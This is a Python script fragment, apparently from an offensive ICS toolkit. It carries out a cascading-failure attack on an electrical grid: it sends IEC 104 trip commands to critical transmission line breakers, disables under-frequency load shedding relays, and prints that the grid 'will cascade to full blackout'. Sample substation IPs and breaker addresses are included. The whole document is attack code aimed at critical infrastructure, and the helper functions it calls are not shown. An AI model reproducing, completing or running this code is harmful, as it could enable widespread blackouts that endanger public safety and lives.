def cascading_failure_attack(critical_lines):
    """
    Initiate cascading grid failure

    critical_lines: List of critical transmission line breakers
                    (identified via power flow analysis)
    """
    print("[!] CRITICAL ATTACK: Cascading Failure Initiation")
    print(f"[*] Targeting {len(critical_lines)} critical transmission lines")

    # Phase 1: Trip critical lines simultaneously
    for line in critical_lines:
        substation_ip = line['substation_ip']
        breaker_ioa = line['breaker_ioa']

        # Send trip command
        attacker = IEC104Attack(substation_ip)
        attacker.connect()
        attacker.send_single_command(breaker_ioa, 0x02)  # OFF
        attacker.close()

        print(f"[+] Tripped: {line['name']}")

    # Phase 2: Disable automatic load shedding
    # Prevent grid from stabilizing
    for load_shedding_relay in load_shedding_relays:
        # Disable under-frequency load shedding (UFLS)
        iec104_modify_relay_settings(
            relay_ip=load_shedding_relay['ip'],
            relay_ioa=load_shedding_relay['ioa'],
            new_setting_value=0.0  # Disable
        )

    print("[+] Automatic load shedding disabled")
    print("[!] Grid will cascade to full blackout")

# Critical transmission lines (example)
'''
critical_lines = [
    {'name': 'Line 500kV A-B', 'substation_ip': '192.168.1.10', 'breaker_ioa': 1},
    {'name': 'Line 500kV C-D', 'substation_ip': '192.168.1.11', 'breaker_ioa': 2},
    {'name': 'Line 345kV E-F', 'substation_ip': '192.168.1.12', 'breaker_ioa': 3}
]

cascading_failure_attack(critical_lines)
'''
